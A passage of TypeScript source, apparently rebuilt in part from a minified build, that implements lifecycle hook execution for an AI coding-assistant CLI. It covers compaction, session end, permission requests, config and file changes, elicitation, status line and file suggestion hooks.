  }
  return { decision: 'proceed', skipConfirm, messages: collected }
}

/**
 * densable ydt — PostModelSwitch. Fire-and-forget; stores pending on yEt.
 */
export function executePostModelSwitchHooks(
  switchTo: ModelSwitchRequest,
  messages: Message[] = [],
  opts: { timeoutMs?: number } = {},
): Promise<void> {
  const session = getModelSwitchSession()
  const store = yEt.of(session)
  const sessionId = session.id
  store.landedOn = { sessionId, toModel: switchTo.toModel }
  const run = (async () => {
    await Osn()
    if (await Lsn(false)) {
      logError(
        new Error(
          'PostModelSwitch: plugin hooks could not be loaded; plugin-delivered hooks are missing from this run',
        ),
      )
    }
    if (cre(switchTo.toModel)) await hJ(switchTo.toModel)
    const contextTokens = contextTokensAfterCompact(messages)
    const hookInput: PostModelSwitchHookInput = {
      ...createBaseHookInput(undefined, sessionId),
      hook_event_name: 'PostModelSwitch',
      from_model: switchTo.fromModel,
      to_model: switchTo.toModel,
      requested_model: switchTo.requestedModel,
      source: switchTo.source,
      ...Ewe(switchTo.toModel, contextTokens),
    }
    const matchQuery = LOe(switchTo.toModel) ? switchTo.toModel : undefined
    const contexts: string[] = []
    const hookMessages: HookResultMessage[] = []
    try {
      for await (const result of executeHooks({
        hookInput,
        toolUseID: modelSwitchToolUseId(),
        matchQuery,
        timeoutMs: opts.timeoutMs ?? Hye,
      })) {
        if (result.additionalContexts) {
          contexts.push(...result.additionalContexts)
        }
        if (result.message?.type === 'attachment') {
          const att = result.message.attachment
          if (att?.type === 'hook_success' && 'content' in att && att.content) {
            if (typeof att.content === 'string') contexts.push(att.content)
          }
          if (att?.type !== 'hook_blocking_error') {
            hookMessages.push(result.message)
          }
        }
        if (result.blockingError) {
          hookMessages.push(
            createAttachmentMessage({
              type: 'hook_blocking_error',
              hookName: 'PostModelSwitch',
              toolUseID: `PostModelSwitch:${switchTo.toModel}`,
              hookEvent: 'PostModelSwitch',
              blockingError: result.blockingError,
            }),
          )
        }
      }
    } catch (err) {
      const closed = err instanceof ControlStreamClosedError
      if (closed) {
        logForDebugging(
          'PostModelSwitch hooks cancelled (control stream closed)',
          { level: 'debug' },
        )
      } else {
        logError(new Error(`PostModelSwitch hooks failed: ${String(err)}`))
      }
    }
    if (contexts.length > 0 || hookMessages.length > 0) {
      store.pending.push({
        sessionId,
        toModel: switchTo.toModel,
        contexts,
        messages: hookMessages,
      })
    }
  })()
    .catch(err => {
      logError(new Error(`PostModelSwitch hooks failed: ${String(err)}`))
    })
    .finally(() => {
      store.inFlight.delete(run)
    })
  store.inFlight.add(run)
  return run
}

/**
 * Execute setup hooks if configured
 * @param trigger The trigger type ('init' or 'maintenance')
 * @param signal Optional AbortSignal to cancel hook execution
 * @param timeoutMs Optional timeout in milliseconds for hook execution
 * @param forceSyncExecution If true, async hooks will not be backgrounded
 * @returns Async generator that yields progress messages and hook results
 */
export async function* executeSetupHooks(
  trigger: 'init' | 'maintenance',
  signal?: AbortSignal,
  timeoutMs: number = TOOL_HOOK_EXECUTION_TIMEOUT_MS,
  forceSyncExecution?: boolean,
): AsyncGenerator<AggregatedHookResult> {
  const hookInput: SetupHookInput = {
    ...createBaseHookInput(undefined),
    hook_event_name: 'Setup',
    trigger,
  }

  // Official mlo: ihr("hook_exec", ees) / try yield* S2 / finally shr
  startSessionActivity('hook_exec', STARTUP_HOOK_HOLD)
  try {
    yield* executeHooks({
      hookInput,
      toolUseID: randomUUID(),
      matchQuery: trigger,
      signal,
      timeoutMs,
      forceSyncExecution,
    })
  } finally {
    invalidateSessionEnvCache()
    stopSessionActivity('hook_exec', STARTUP_HOOK_HOLD)
  }
}

/**
 * Execute subagent start hooks if configured
 * @param agentId The unique identifier for the subagent
 * @param agentType The type/name of the subagent being started
 * @param signal Optional AbortSignal to cancel hook execution
 * @param timeoutMs Optional timeout in milliseconds for hook execution
 * @returns Async generator that yields progress messages and hook results
 */
export async function* executeSubagentStartHooks(
  agentId: string,
  agentType: string,
  signal?: AbortSignal,
  timeoutMs: number = TOOL_HOOK_EXECUTION_TIMEOUT_MS,
  storageV5?: unknown,
): AsyncGenerator<AggregatedHookResult> {
  const hookInput: SubagentStartHookInput = {
    ...createBaseHookInput(undefined),
    hook_event_name: 'SubagentStart',
    agent_id: agentId,
    agent_type: agentType,
  }

  yield* executeHooks({
    hookInput,
    toolUseID: randomUUID(),
    matchQuery: agentType,
    signal,
    timeoutMs,
    storageV5: storageV5 ?? getPinnedStorageV5(),
  })
}

/**
 * Execute pre-compact hooks if configured
 * @param compactData The compact data to pass to hooks
 * @param signal Optional AbortSignal to cancel hook execution
 * @param timeoutMs Optional timeout in milliseconds for hook execution
 * @returns Object with optional newCustomInstructions and userDisplayMessage
 */
const PRECOMPACT_OUTPUT_LIMIT = 10_000
const PRECOMPACT_PRESERVE_MARKERS = [
  '<artifact-content-authored-by-others/>',
  '<remote-control-device-report/>',
]

function sliceUtf16Safe(text: string, maxLen: number): string {
  if (maxLen <= 0) return ''
  if (text.length <= maxLen) return text
  const cut = text.slice(0, maxLen)
  const last = cut.charCodeAt(maxLen - 1)
  return last >= 0xd800 && last <= 0xdbff ? cut.slice(0, -1) : cut
}

export async function executePreCompactHooks(
  compactData: {
    trigger: 'manual' | 'auto'
    customInstructions: string | null
  },
  signal?: AbortSignal,
  timeoutMs: number = TOOL_HOOK_EXECUTION_TIMEOUT_MS,
  context?: ToolUseContext,
): Promise<{
  newCustomInstructions?: string
  userDisplayMessage?: string
  blockedBy?: string
}> {
  if (context?.options.settingsHooksOff === true) return {}
  const delegated = isDelegatedObservation(getAgentContext())
  const hookInput: PreCompactHookInput = {
    ...createBaseHookInput(undefined),
    hook_event_name: 'PreCompact',
    trigger: compactData.trigger,
    custom_instructions: compactData.customInstructions,
  }

  const results = await executeHooksOutsideREPL({
    hookInput,
    matchQuery: compactData.trigger,
    signal,
    timeoutMs,
    storageV5: context?.storageV5,
    credentials: context?.credentials,
    agentId: context?.agentId,
  })

  if (results.length === 0) {
    return {}
  }

  // Extract custom instructions from successful hooks with non-empty output
  // and build user display messages with command info (cut at 10,000 chars per hook)
  const successfulOutputs: string[] = []
  const displayMessages: string[] = []
  for (const result of results) {
    if (result.cancelled) continue
    let trimmed = result.output.trim()
    if (result.succeeded && !result.blocked) {
      let preservedPrefix = ''
      if (trimmed.length > PRECOMPACT_OUTPUT_LIMIT) {
        logForDebugging(
          `PreCompact [${result.command}] output cut from ${trimmed.length} to ${PRECOMPACT_OUTPUT_LIMIT} characters`,
          { level: 'warn' },
        )
        const cut = sliceUtf16Safe(trimmed, PRECOMPACT_OUTPUT_LIMIT)
        const markers = PRECOMPACT_PRESERVE_MARKERS.filter(m =>
          trimmed.includes(m),
        )
        preservedPrefix = markers
          .filter(m => !cut.includes(m))
          .map(m => `${m}\n`)
          .join('')
        trimmed = `${cut}\n\n[PreCompact hook [${result.command}] output cut: ${trimmed.length} characters is over the ${PRECOMPACT_OUTPUT_LIMIT}-character limit]`
      }
      if (trimmed) {
        successfulOutputs.push(`${preservedPrefix}${trimmed}`)
        displayMessages.push(
          `PreCompact [${result.command}] completed successfully: ${trimmed}`,
        )
      } else {
        displayMessages.push(
          `PreCompact [${result.command}] completed successfully`,
        )
      }
    } else {
      if (trimmed) {
        displayMessages.push(
          `PreCompact [${result.command}] failed: ${trimmed}`,
        )
      } else {
        displayMessages.push(`PreCompact [${result.command}] failed`)
      }
    }
  }

  const blocked = results.filter(result => result.blocked)
  const blockResult =
    blocked.length > 0
      ? {
          blockedBy: blocked
            .map(result => {
              const output = result.output.trim()
              return `[${result.command}]${output ? `: ${output}` : ''}`
            })
            .join('\n'),
        }
      : {}
  if (delegated) return blockResult
  return {
    ...blockResult,
    newCustomInstructions:
      successfulOutputs.length > 0 ? successfulOutputs.join('\n\n') : undefined,
    userDisplayMessage:
      displayMessages.length > 0 ? displayMessages.join('\n') : undefined,
  }
}

/**
 * Execute post-compact hooks if configured
 * @param compactData The compact data to pass to hooks, including the summary
 * @param signal Optional AbortSignal to cancel hook execution
 * @param timeoutMs Optional timeout in milliseconds for hook execution
 * @returns Object with optional userDisplayMessage
 */
export async function executePostCompactHooks(
  compactData: {
    trigger: 'manual' | 'auto'
    compactSummary: string
  },
  signal?: AbortSignal,
  timeoutMs: number = TOOL_HOOK_EXECUTION_TIMEOUT_MS,
  context?: ToolUseContext,
): Promise<{
  userDisplayMessage?: string
}> {
  if (
    context?.options.settingsHooksOff === true ||
    isDelegatedObservation(getAgentContext())
  )
    return {}
  const hookInput: PostCompactHookInput = {
    ...createBaseHookInput(undefined),
    hook_event_name: 'PostCompact',
    trigger: compactData.trigger,
    compact_summary: compactData.compactSummary,
  }

  const results = await executeHooksOutsideREPL({
    hookInput,
    matchQuery: compactData.trigger,
    signal,
    timeoutMs,
    storageV5: context?.storageV5,
    credentials: context?.credentials,
    agentId: context?.agentId,
  })

  if (results.length === 0) {
    return {}
  }

  const displayMessages: string[] = []
  for (const result of results) {
    if (result.cancelled) continue
    if (result.succeeded) {
      if (result.output.trim()) {
        displayMessages.push(
          `PostCompact [${result.command}] completed successfully: ${result.output.trim()}`,
        )
      } else {
        displayMessages.push(
          `PostCompact [${result.command}] completed successfully`,
        )
      }
    } else {
      if (result.output.trim()) {
        displayMessages.push(
          `PostCompact [${result.command}] failed: ${result.output.trim()}`,
        )
      } else {
        displayMessages.push(`PostCompact [${result.command}] failed`)
      }
    }
  }

  return {
    userDisplayMessage:
      displayMessages.length > 0 ? displayMessages.join('\n') : undefined,
  }
}

/**
 * Execute session end hooks if configured
 * @param reason The reason for ending the session
 * @param options Optional parameters including app state functions and signal
 * @returns Promise that resolves when all hooks complete
 */
export async function executeSessionEndHooks(
  reason: ExitReason,
  options?: {
    getAppState?: () => AppState
    setAppState?: (updater: (prev: AppState) => AppState) => void
    signal?: AbortSignal
    timeoutMs?: number
    storageV5?: unknown
    credentials?: unknown
  },
): Promise<void> {
  const {
    getAppState,
    setAppState,
    signal,
    timeoutMs = getSessionEndHookTimeoutMs(),
    storageV5,
    credentials,
  } = options || {}

  const endingSessionId = getSessionId()
  const hookInput = {
    ...createBaseHookInput(undefined),
    hook_event_name: 'SessionEnd' as const,
    reason,
  } as unknown as SessionEndHookInput

  const results = await executeHooksOutsideREPL({
    getAppState,
    hookInput,
    matchQuery: reason,
    signal,
    timeoutMs,
    storageV5: storageV5 ?? getPinnedStorageV5(),
    credentials,
  })

  // During shutdown, Ink is unmounted so we can write directly to stderr
  for (const result of results) {
    if (!result.succeeded && result.output) {
      process.stderr.write(
        `SessionEnd hook [${result.command}] failed: ${result.output}\n`,
      )
    }
  }

  // Clear session hooks after execution
  if (setAppState) {
    clearSessionHooks(setAppState, endingSessionId)
  }

  if (
    !isBareMode() &&
    !shouldDisableAllHooksIncludingManaged() &&
    hasMatchingFunctionHook('session.end')
  ) {
    const boundMs = getSessionEndHooksBoundMs()
    const boundSignal = signal
      ? AbortSignal.any([signal, AbortSignal.timeout(boundMs)])
      : AbortSignal.timeout(boundMs)
    let boundTimer: ReturnType<typeof setTimeout> | undefined
    try {
      await Promise.race([
        runFunctionHookChain(
          'session.end',
          {
            sessionId: endingSessionId,
            reason,
            resume: { id: endingSessionId },
          },
          async () => ({ sessionId: endingSessionId }),
          undefined,
          undefined,
          { signal: boundSignal },
        ),
        new Promise<never>((_, reject) => {
          boundTimer = setTimeout(
            () => reject(new Error('SessionEnd bound exceeded')),
            boundMs,
          )
          boundTimer.unref?.()
        }),
      ])
    } catch (err) {
      const detail = boundSignal.aborted
        ? 'cut at the SessionEnd bound, the session ends regardless'
        : `failed: ${err instanceof Error ? err.message : String(err)}`
      logForDebugging(`session.end (${reason}): ${detail}`, { level: 'warn' })
    } finally {
      if (boundTimer !== undefined) clearTimeout(boundTimer)
    }
  }
}

/**
 * Execute permission request hooks if configured
 * These hooks are called when a permission dialog would be displayed to the user.
 * Hooks can approve or deny the permission request programmatically.
 * @param toolName The name of the tool requesting permission
 * @param toolUseID The ID of the tool use
 * @param toolInput The input that would be passed to the tool
 * @param toolUseContext ToolUseContext for the request
 * @param permissionMode Optional permission mode from toolPermissionContext
 * @param permissionSuggestions Optional permission suggestions (the "always allow" options)
 * @param signal Optional AbortSignal to cancel hook execution
 * @param timeoutMs Optional timeout in milliseconds for hook execution
 * @returns Async generator that yields progress messages and returns aggregated result
 */
export async function* executePermissionRequestHooks<ToolInput>(
  toolName: string,
  toolUseID: string,
  toolInput: ToolInput,
  toolUseContext: ToolUseContext,
  permissionMode?: string,
  permissionSuggestions?: PermissionUpdate[],
  signal?: AbortSignal,
  timeoutMs: number = TOOL_HOOK_EXECUTION_TIMEOUT_MS,
  requestPrompt?: (
    sourceName: string,
    toolInputSummary?: string | null,
  ) => (request: PromptRequest) => Promise<PromptResponse>,
  toolInputSummary?: string | null,
): AsyncGenerator<AggregatedHookResult> {
  logForDebugging(`executePermissionRequestHooks called for tool: ${toolName}`)

  const hookInput: PermissionRequestHookInput = {
    ...createBaseHookInput(permissionMode, undefined, toolUseContext),
    hook_event_name: 'PermissionRequest',
    tool_name: toolName,
    ...getToolHookMcpMetadata(toolName, toolUseContext),
    tool_input: toolInput,
    permission_suggestions: permissionSuggestions,
  }

  yield* executeHooks({
    hookInput,
    toolUseID,
    matchQuery: toolName,
    signal,
    timeoutMs,
    toolUseContext,
    requestPrompt,
    toolInputSummary,
  })
}

export type ConfigChangeSource =
  | 'user_settings'
  | 'project_settings'
  | 'local_settings'
  | 'policy_settings'
  | 'skills'

/**
 * Execute config change hooks when configuration files change during a session.
 * Fired by file watchers when settings, skills, or commands change on disk.
 * Enables enterprise admins to audit/log configuration changes for security.
 *
 * Policy settings are enterprise-managed and must never be blockable by hooks.
 * Hooks still fire (for audit logging) but blocking results are ignored — callers
 * will always see an empty result for policy sources.
 *
 * @param source The type of config that changed
 * @param filePath Optional path to the changed file
 * @param timeoutMs Optional timeout in milliseconds for hook execution
 */
export async function executeConfigChangeHooks(
  source: ConfigChangeSource,
  filePath?: string,
  timeoutMs: number = TOOL_HOOK_EXECUTION_TIMEOUT_MS,
  persist: { storageV5?: unknown; credentials?: unknown } = {},
): Promise<HookOutsideReplResult[]> {
  const hookInput: ConfigChangeHookInput = {
    ...createBaseHookInput(undefined),
    hook_event_name: 'ConfigChange',
    source,
    file_path: filePath,
  }

  const results = await executeHooksOutsideREPL({
    hookInput,
    timeoutMs,
    matchQuery: source,
    storageV5: persist.storageV5 ?? getPinnedStorageV5(),
    credentials: persist.credentials,
  })

  // Policy settings are enterprise-managed — hooks fire for audit logging
  // but must never block policy changes from being applied
  if (source === 'policy_settings') {
    return results.map(r => ({ ...r, blocked: false }))
  }

  return results
}

async function executeEnvHooks(
  hookInput: HookInput,
  timeoutMs: number,
  persist: { storageV5?: unknown; credentials?: unknown } = {},
): Promise<{
  results: HookOutsideReplResult[]
  watchPaths: string[]
  systemMessages: string[]
}> {
  const results = await executeHooksOutsideREPL({
    hookInput,
    timeoutMs,
    storageV5: persist.storageV5 ?? getPinnedStorageV5(),
    credentials: persist.credentials,
  })
  if (results.length > 0) {
    invalidateSessionEnvCache()
  }
  const watchPaths = results.flatMap(r => r.watchPaths ?? [])
  const systemMessages = results
    .map(r => r.systemMessage)
    .filter((m): m is string => !!m)
  return { results, watchPaths, systemMessages }
}

export function executeCwdChangedHooks(
  oldCwd: string,
  newCwd: string,
  timeoutMs: number = TOOL_HOOK_EXECUTION_TIMEOUT_MS,
  persist: { storageV5?: unknown; credentials?: unknown } = {},
): Promise<{
  results: HookOutsideReplResult[]
  watchPaths: string[]
  systemMessages: string[]
}> {
  const hookInput: CwdChangedHookInput = {
    ...createBaseHookInput(undefined),
    hook_event_name: 'CwdChanged',
    old_cwd: oldCwd,
    new_cwd: newCwd,
  }
  return executeEnvHooks(hookInput, timeoutMs, persist)
}

export function executeFileChangedHooks(
  filePath: string,
  event: 'change' | 'add' | 'unlink',
  timeoutMs: number = TOOL_HOOK_EXECUTION_TIMEOUT_MS,
  persist: { storageV5?: unknown; credentials?: unknown } = {},
): Promise<{
  results: HookOutsideReplResult[]
  watchPaths: string[]
  systemMessages: string[]
}> {
  const hookInput = {
    ...createBaseHookInput(undefined),
    hook_event_name: 'FileChanged' as const,
    file_path: filePath,
    event,
  } as unknown as FileChangedHookInput
  return executeEnvHooks(hookInput, timeoutMs, persist)
}

/**
 * densable 2.1.219 s2t / executeDirectoryAddedHooks:
 *   n = { ...Kf(void 0), hook_event_name: "DirectoryAdded", directory: e, source: t }
 *   o = await wL({ hookInput: n, matchQuery: t, timeoutMs: r })
 *   return { results: o, systemMessages: o.map(systemMessage).filter(Boolean) }
 *
 * @param directory Absolute path of the directory that was added
 * @param source "slash_command" for /add-dir, "register_repo_root" for SDK control_request
 */
export async function executeDirectoryAddedHooks(
  directory: string,
  source: 'slash_command' | 'register_repo_root',
  timeoutMs: number = TOOL_HOOK_EXECUTION_TIMEOUT_MS,
  persist: { storageV5?: unknown; credentials?: unknown } = {},
): Promise<{
  results: HookOutsideReplResult[]
  systemMessages: string[]
}> {
  const hookInput: DirectoryAddedHookInput = {
    ...createBaseHookInput(undefined),
    hook_event_name: 'DirectoryAdded',
    directory,
    source,
  }
  const results = await executeHooksOutsideREPL({
    hookInput,
    matchQuery: source,
    timeoutMs,
    storageV5: persist.storageV5 ?? getPinnedStorageV5(),
    credentials: persist.credentials,
  })
  const systemMessages = results
    .map(r => r.systemMessage)
    .filter((m): m is string => !!m)
  return { results, systemMessages }
}

/**
 * densable GCr — MessageDisplay hook flush generator.
 * forceSyncExecution + suppressPerInvocationTelemetry for streaming hot path.
 */
export async function* executeMessageDisplayHooks(
  params: {
    turnId: string
    messageId: string
    index: number
    final: boolean
    delta: string
  },
  getAppState: () => AppState,
  signal?: AbortSignal,
  timeoutMs: number = 10_000,
): AsyncGenerator<AggregatedHookResult> {
  const hookInput: MessageDisplayHookInput = {
    ...createBaseHookInput(undefined),
    hook_event_name: 'MessageDisplay',
    turn_id: params.turnId,
    message_id: params.messageId,
    index: params.index,
    final: params.final,
    delta: params.delta,
  }
  yield* executeHooks({
    hookInput,
    toolUseID: `${params.messageId}-${params.index}`,
    signal,
    timeoutMs,
    forceSyncExecution: true,
    // densable suppressPerInvocationTelemetry — keep stream path quiet
    suppressPerInvocationTelemetry: true,
    toolUseContext: {
      getAppState,
    } as ToolUseContext,
  })
}

export type InstructionsLoadReason =
  | 'session_start'
  | 'nested_traversal'
  | 'path_glob_match'
  | 'include'
  | 'compact'

export type InstructionsMemoryType = 'User' | 'Project' | 'Local' | 'Managed'

/**
 * Check if InstructionsLoaded hooks are configured (without executing them).
 * Callers should check this before invoking executeInstructionsLoadedHooks to avoid
 * building hook inputs for every instruction file when no hook is configured.
 *
 * Checks both settings-file hooks (getHooksConfigFromSnapshot) and registered
 * hooks (plugin hooks + SDK callback hooks via registerHookCallbacks). Session-
 * derived hooks (structured output enforcement etc.) are internal and not checked.
 */
export function hasInstructionsLoadedHook(): boolean {
  const snapshotHooks = getHooksConfigFromSnapshot()?.['InstructionsLoaded']
  if (snapshotHooks && snapshotHooks.length > 0) return true
  const registeredHooks = getRegisteredHooks()?.['InstructionsLoaded']
  if (registeredHooks && registeredHooks.length > 0) return true
  return false
}

/**
 * Execute InstructionsLoaded hooks when an instruction file (CLAUDE.md or
 * .claude/rules/*.md) is loaded into context. Fire-and-forget — this hook is
 * for observability/audit only and does not support blocking.
 *
 * Dispatch sites:
 * - Eager load at session start (getMemoryFiles in claudemd.ts)
 * - Eager reload after compaction (getMemoryFiles cache cleared by
 *   runPostCompactCleanup; next call reports load_reason: 'compact')
 * - Lazy load when Claude touches a file that triggers nested CLAUDE.md or
 *   conditional rules with paths: frontmatter (memoryFilesToAttachments in
 *   attachments.ts)
 */
export async function executeInstructionsLoadedHooks(
  filePath: string,
  memoryType: InstructionsMemoryType,
  loadReason: InstructionsLoadReason,
  options?: {
    globs?: string[]
    triggerFilePath?: string
    parentFilePath?: string
    timeoutMs?: number
  },
): Promise<void> {
  const {
    globs,
    triggerFilePath,
    parentFilePath,
    timeoutMs = TOOL_HOOK_EXECUTION_TIMEOUT_MS,
  } = options ?? {}

  const hookInput: InstructionsLoadedHookInput = {
    ...createBaseHookInput(undefined),
    hook_event_name: 'InstructionsLoaded',
    file_path: filePath,
    memory_type: memoryType,
    load_reason: loadReason,
    globs,
    trigger_file_path: triggerFilePath,
    parent_file_path: parentFilePath,
  }

  await executeHooksOutsideREPL({
    hookInput,
    timeoutMs,
    matchQuery: loadReason,
  })
}

/** Result of an elicitation hook execution (non-REPL path). */
export type ElicitationHookResult = {
  elicitationResponse?: ElicitationResponse
  blockingError?: HookBlockingError
}

/** Result of an elicitation-result hook execution (non-REPL path). */
export type ElicitationResultHookResult = {
  elicitationResultResponse?: ElicitationResponse
  blockingError?: HookBlockingError
}

/**
 * Parse elicitation-specific fields from a HookOutsideReplResult.
 * Mirrors the relevant branches of processHookJSONOutput for Elicitation
 * and ElicitationResult hook events.
 */
function parseElicitationHookOutput(
  result: HookOutsideReplResult,
  expectedEventName: 'Elicitation' | 'ElicitationResult',
): {
  response?: ElicitationResponse
  blockingError?: HookBlockingError
} {
  // Exit code 2 = blocking (same as executeHooks path)
  if (result.blocked && !result.succeeded) {
    return {
      blockingError: {
        blockingError: result.output || `Elicitation blocked by hook`,
        command: result.command,
      },
    }
  }

  if (!result.output.trim()) {
    return {}
  }

  // Try to parse JSON output for structured elicitation response
  const trimmed = result.output.trim()
  if (!trimmed.startsWith('{')) {
    return {}
  }

  try {
    const parsed = hookJSONOutputSchema().parse(JSON.parse(trimmed))
    if (isAsyncHookJSONOutput(parsed)) {
      return {}
    }
    if (!isSyncHookJSONOutput(parsed)) {
      return {}
    }

    // Cast to typed interface for type-safe property access
    const typedParsed = parsed as TypedSyncHookOutput

    // Check for top-level decision: 'block' (exit code 0 + JSON block)
    if (typedParsed.decision === 'block' || result.blocked) {
      return {
        blockingError: {
          blockingError: typedParsed.reason || 'Elicitation blocked by hook',
          command: result.command,
        },
      }
    }

    const specific = typedParsed.hookSpecificOutput
    if (!specific || specific.hookEventName !== expectedEventName) {
      return {}
    }

    if (!('action' in specific) || !(specific as { action?: string }).action) {
      return {}
    }

    const typedSpecific = specific as {
      action: string
      content?: Record<string, unknown>
    }
    const response: ElicitationResponse = {
      action: typedSpecific.action as ElicitationResponse['action'],
      content: typedSpecific.content as
        | ElicitationResponse['content']
        | undefined,
    }

    const out: {
      response?: ElicitationResponse
      blockingError?: HookBlockingError
    } = { response }

    if (typedSpecific.action === 'decline') {
      out.blockingError = {
        blockingError:
          typedParsed.reason ||
          (expectedEventName === 'Elicitation'
            ? 'Elicitation denied by hook'
            : 'Elicitation result blocked by hook'),
        command: result.command,
      }
    }

    return out
  } catch {
    return {}
  }
}

export async function executeElicitationHooks({
  serverName,
  message,
  requestedSchema,
  permissionMode,
  signal,
  timeoutMs = TOOL_HOOK_EXECUTION_TIMEOUT_MS,
  mode,
  url,
  elicitationId,
  storageV5,
  credentials,
}: {
  serverName: string
  message: string
  requestedSchema?: Record<string, unknown>
  permissionMode?: string
  signal?: AbortSignal
  timeoutMs?: number
  mode?: 'form' | 'url'
  url?: string
  elicitationId?: string
  storageV5?: unknown
  credentials?: unknown
}): Promise<ElicitationHookResult> {
  const hookInput: ElicitationHookInput = {
    ...createBaseHookInput(permissionMode),
    hook_event_name: 'Elicitation',
    mcp_server_name: serverName,
    message,
    mode,
    url,
    elicitation_id: elicitationId,
    requested_schema: requestedSchema,
  }

  const results = await executeHooksOutsideREPL({
    hookInput,
    matchQuery: serverName,
    signal,
    timeoutMs,
    storageV5: storageV5 ?? getPinnedStorageV5(),
    credentials,
  })

  let elicitationResponse: ElicitationResponse | undefined
  let blockingError: HookBlockingError | undefined

  for (const result of results) {
    const parsed = parseElicitationHookOutput(result, 'Elicitation')
    if (parsed.blockingError) {
      blockingError = parsed.blockingError
    }
    if (parsed.response) {
      elicitationResponse = parsed.response
    }
  }

  return { elicitationResponse, blockingError }
}

export async function executeElicitationResultHooks({
  serverName,
  action,
  content,
  permissionMode,
  signal,
  timeoutMs = TOOL_HOOK_EXECUTION_TIMEOUT_MS,
  mode,
  elicitationId,
  storageV5,
  credentials,
}: {
  serverName: string
  action: 'accept' | 'decline' | 'cancel'
  content?: Record<string, unknown>
  permissionMode?: string
  signal?: AbortSignal
  timeoutMs?: number
  mode?: 'form' | 'url'
  elicitationId?: string
  storageV5?: unknown
  credentials?: unknown
}): Promise<ElicitationResultHookResult> {
  const hookInput: ElicitationResultHookInput = {
    ...createBaseHookInput(permissionMode),
    hook_event_name: 'ElicitationResult',
    mcp_server_name: serverName,
    elicitation_id: elicitationId,
    mode,
    action,
    content,
  }

  const results = await executeHooksOutsideREPL({
    hookInput,
    matchQuery: serverName,
    signal,
    timeoutMs,
    storageV5: storageV5 ?? getPinnedStorageV5(),
    credentials,
  })

  let elicitationResultResponse: ElicitationResponse | undefined
  let blockingError: HookBlockingError | undefined

  for (const result of results) {
    const parsed = parseElicitationHookOutput(result, 'ElicitationResult')
    if (parsed.blockingError) {
      blockingError = parsed.blockingError
    }
    if (parsed.response) {
      elicitationResultResponse = parsed.response
    }
  }

  return { elicitationResultResponse, blockingError }
}

/**
 * Execute status line command if configured
 * @param statusLineInput The structured status input that will be converted to JSON
 * @param signal Optional AbortSignal to cancel hook execution
 * @param timeoutMs Optional timeout in milliseconds for hook execution
 * @returns The status line text to display, or undefined if no command configured
 */
export async function executeStatusLineCommand(
  statusLineInput: StatusLineCommandInput,
  signal?: AbortSignal,
  timeoutMs: number = 5000, // Short timeout for status line
  logResult: boolean = false,
  storageV5?: unknown,
): Promise<string | undefined> {
  // Check if all hooks (including statusLine) are disabled by managed settings
  if (shouldDisableAllHooksIncludingManaged()) {
    return undefined
  }

  // SECURITY: ALL hooks require workspace trust in interactive mode
  // This centralized check prevents RCE vulnerabilities for all current and future hooks
  if (shouldSkipHookDueToTrust()) {
    logForDebugging(
      `Skipping StatusLine command execution - workspace trust not accepted`,
    )
    return undefined
  }

  // When disableAllHooks is set in non-managed settings, only managed statusLine runs
  // (non-managed settings cannot disable managed commands, but non-managed commands are disabled)
  let statusLine
  if (shouldAllowManagedHooksOnly()) {
    statusLine = getSettingsForSource('policySettings')?.statusLine
  } else {
    statusLine = getSettings_DEPRECATED()?.statusLine
  }

  if (!statusLine || statusLine.type !== 'command') {
    return undefined
  }

  // Use provided signal or create a default one
  const abortSignal = signal || AbortSignal.timeout(timeoutMs)

  try {
    // Convert status input to JSON
    const jsonInput = jsonStringify(statusLineInput)

    const result = await execCommandHook(
      statusLine,
      'StatusLine',
      'statusLine',
      jsonInput,
      abortSignal,
      randomUUID(),
      undefined,
      undefined,
      undefined,
      undefined,
      undefined,
      undefined,
      storageV5 ?? getPinnedStorageV5(),
    )

    if (result.aborted) {
      return undefined
    }

    // For successful hooks (exit code 0), use stdout
    if (result.status === 0) {
      // Trim and split output into lines, then join with newlines
      const output = result.stdout
        .trim()
        .split('\n')
        .flatMap(line => line.trim() || [])
        .join('\n')

      if (output) {
        if (logResult) {
          logForDebugging(
            `StatusLine [${statusLine.command}] completed with status ${result.status}`,
          )
        }
        return output
      }
    } else if (logResult) {
      logForDebugging(
        `StatusLine [${statusLine.command}] completed with status ${result.status}`,
        { level: 'warn' },
      )
    }

    return undefined
  } catch (error) {
    logForDebugging(`Status hook failed: ${error}`, { level: 'error' })
    return undefined
  }
}

/**
 * Execute file suggestion command if configured
 * @param fileSuggestionInput The structured input that will be converted to JSON
 * @param signal Optional AbortSignal to cancel hook execution
 * @param timeoutMs Optional timeout in milliseconds for hook execution
 * @returns Array of file paths, or empty array if no command configured
 */
export async function executeFileSuggestionCommand(
  fileSuggestionInput: FileSuggestionCommandInput,
  signal?: AbortSignal,
  timeoutMs: number = 5000, // Short timeout for typeahead suggestions
  storageV5?: unknown,
): Promise<string[]> {
  // Check if all hooks are disabled by managed settings
  if (shouldDisableAllHooksIncludingManaged()) {
    return []
  }

  // SECURITY: ALL hooks require workspace trust in interactive mode
  // This centralized check prevents RCE vulnerabilities for all current and future hooks
  if (shouldSkipHookDueToTrust()) {
    logForDebugging(
      `Skipping FileSuggestion command execution - workspace trust not accepted`,
    )
    return []
  }

  // When disableAllHooks is set in non-managed settings, only managed fileSuggestion runs
  // (non-managed settings cannot disable managed commands, but non-managed commands are disabled)
  let fileSuggestion
  if (shouldAllowManagedHooksOnly()) {
    fileSuggestion = getSettingsForSource('policySettings')?.fileSuggestion
  } else {
    fileSuggestion = getSettings_DEPRECATED()?.fileSuggestion
  }

  if (!fileSuggestion || fileSuggestion.type !== 'command') {
    return []
  }

  // Use provided signal or create a default one
  const abortSignal = signal || AbortSignal.timeout(timeoutMs)

  try {
    const jsonInput = jsonStringify(fileSuggestionInput)

    const hook = { type: 'command' as const, command: fileSuggestion.command }

    const result = await execCommandHook(
      hook,
      'FileSuggestion',
      'FileSuggestion',
      jsonInput,
      abortSignal,
      randomUUID(),
      undefined,
      undefined,
      undefined,
      undefined,
      undefined,
      undefined,
      storageV5 ?? getPinnedStorageV5(),
    )

    if (result.aborted || result.status !== 0) {
      return []
    }

    return result.stdout
      .split('\n')
      .map(line => line.trim())
      .filter(Boolean)
  } catch (error) {
    logForDebugging(`File suggestion helper failed: ${error}`, {
      level: 'error',
    })
    return []
  }
}

async function executeFunctionHook({
  hook,
  messages,
  hookName,
  toolUseID,
  hookEvent,
  timeoutMs,
  signal,
}: {
  hook: FunctionHook
  messages: Message[]
  hookName: string
  toolUseID: string
  hookEvent: HookEvent
  timeoutMs: number
  signal?: AbortSignal
}): Promise<HookResult> {
  const callbackTimeoutMs = hook.timeout ?? timeoutMs
  const { signal: abortSignal, cleanup } = createCombinedAbortSignal(signal, {
